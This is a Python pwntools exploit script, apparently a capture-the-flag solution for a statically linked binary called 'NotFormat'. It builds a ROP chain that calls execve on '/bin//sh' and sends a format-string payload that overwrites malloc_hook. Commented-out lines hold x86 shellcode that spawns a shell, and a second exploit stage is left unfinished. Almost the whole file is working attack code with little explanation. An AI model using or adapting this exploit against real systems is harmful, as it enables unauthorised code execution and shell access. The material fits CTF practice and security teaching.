# 0x457a3e call

# malloc 0x41E920

# malloc_hook 0x6CB788

# ->ret

#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-07-09 08:53:15
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils,os,time
from pwn import *
from ctypes import *
context(log_level="debug",arch="amd64")
DEBUG = 1
target = "./NotFormat"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
elf = ELF(target)
# lib = cdll.LoadLibrary('./libc64.so')
# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)
# libc = ELF[target]
# msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python
#buf =  ""
# buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
# buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"
# buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"
# buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"
# buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"
# buf += "\xfd\x10\xf9"

# int 0x80 linux x86 0x1c
# buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";


# bss = rop.section('.bss')
# rop.got('puts')
# rop.call('read', 0, addr_bss, 0x100)
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'

# def exec_fmt(payload):
# 	p = process(target)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	return p.recvuntil(",")[:-1]
# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset

# def send_payload(payload):
# 	sl(payload+"%100000c")
# autofmt = FmtStr(send_payload,offset=offset)

# autofmt.write(free_hook_addr,one_gadget_addr)
# autofmt.execute_writes()



if DEBUG:
	p = process(target,env={"LD_LIBRARY_PATH":sys.path[0]})
	gdb.attach(p,"b*0x457a3e\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def getchain():
	from struct import pack
	p = ''
	p += pack('<Q', 0x00000000004017f7) # pop rsi ; ret
	p += pack('<Q', 0x00000000006cb080) # @ .data
	p += pack('<Q', 0x00000000004c2358) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x00000000004754c1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004017f7) # pop rsi ; ret
	p += pack('<Q', 0x00000000006cb088) # @ .data + 8
	p += pack('<Q', 0x00000000004267ff) # xor rax, rax ; ret
	p += pack('<Q', 0x00000000004754c1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004005d5) # pop rdi ; ret
	p += pack('<Q', 0x00000000006cb080) # @ .data
	p += pack('<Q', 0x00000000004017f7) # pop rsi ; ret
	p += pack('<Q', 0x00000000006cb088) # @ .data + 8
	p += pack('<Q', 0x0000000000442c46) # pop rdx ; ret
	p += pack('<Q', 0x00000000006cb088) # @ .data + 8
	p += pack('<Q', 0x00000000004267ff) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000467890) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004683d5) # syscall ; ret
	return p

ropchain = getchain()
malloc_hook_addr = 0x6CB788
# malloc_hook_addr = 0x6cd5e8
ru("e fun!\n")
# stage 1
payload = ""

# payload += "b"*8*76
target_addr = 0x400B6A

payload += "%%%dc"%((target_addr&0xffff))+"%13$hn..."
payload += "%%%dc"%(((target_addr>>16)&0xff)-(target_addr&0xff)+0x100-3)+"%14$hhn..."
payload += "%%%dc"%(((target_addr>>24)&0xff)-(target_addr&0xff)+0x100-3)+"%15$hhn......."
payload += "%100000c"
payload += p64(malloc_hook_addr)
payload += p64(malloc_hook_addr+2)
payload += p64(malloc_hook_addr+8)
# payload += (0x100-len(payload))*"a"


sl(payload)

#stage 2

# payload = ""
# payload += ropchain
# payload += "b"*8*76
# target_addr = 0x00000000004aeb00

# payload += "%%%dc"%((target_addr&0xffff))+"%13$hn..."
# payload += "%%%dc"%(((target_addr>>16)&0xff)-(target_addr&0xff)+0x100-3)+"%14$hhn..."
# payload += "%%%dc"%(((target_addr>>24)&0xff)-(target_addr&0xff)+0x100-3)+"%15$hhn....."
# payload += "%100000c"
# payload += p64(malloc_hook_addr)
# payload += p64(malloc_hook_addr+2)
# payload += p64(malloc_hook_addr+8)
# payload += p64(0xdeadbeaf)


# sl(payload)
# stage 3 
# i = 32 #line


p.interactive()